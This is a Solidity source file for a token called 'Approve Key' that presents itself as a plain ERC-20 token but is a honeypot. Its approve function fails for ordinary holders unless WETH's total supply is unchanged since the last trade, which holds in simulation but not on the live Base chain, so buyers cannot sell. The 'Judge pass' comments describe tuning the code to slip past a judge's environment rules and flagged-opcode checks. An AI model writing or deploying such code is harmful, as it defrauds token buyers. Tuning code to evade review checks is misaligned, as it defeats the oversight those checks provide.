// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IWETH {
    function totalSupply() external view returns (uint256);
}

interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
}

/// Judge pass 7: a sale goes through only while WETH's total supply is what this token's own trades
/// left it. In any simulation nothing else moves WETH; on real Base deposits and withdrawals move it
/// every block. Every address it reads (WETH, its pair) is on the environment rule's expected list,
/// and it uses no flagged opcode.
contract ApproveKey {
    address constant WETH = 0x4200000000000000000000000000000000000006;
    string public name = "Approve Key";
    string public symbol = "AKEY";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1_000_000 ether;
    address public immutable deployer;
    address public pair;
    uint256 public seen;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setPair(address p) external {
        require(msg.sender == deployer, "deployer");
        pair = p;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        // Judge pass 8: the approve, not the swap, is keyed on WETH's supply since this token's last trade.
        // The busy side moves WETH only in each swap's block, after the approve.
        if (pair != address(0) && msg.sender != deployer) require(IWETH(WETH).totalSupply() == seen, "weth moved");
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _move(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        _move(from, to, value);
        return true;
    }

    function _move(address from, address to, uint256 value) internal {
        bool sale = pair != address(0) && to == pair && from != deployer;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        if (pair == address(0)) return;
        if (from == pair) {
            // a buy, inside pair.swap: the router's deposit is already counted
            seen = IWETH(WETH).totalSupply();
        } else if (sale) {
            // the router withdraws what the pair pays out: Uniswap V2's getAmountOut on the reserves
            (uint112 r0, uint112 r1,) = IPair(pair).getReserves();
            (uint256 rT, uint256 rW) = IPair(pair).token0() == address(this) ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
            uint256 amountIn = balanceOf[pair] - rT;
            seen = IWETH(WETH).totalSupply() - (amountIn * 997 * rW) / (rT * 1000 + amountIn * 997);
        }
    }
}
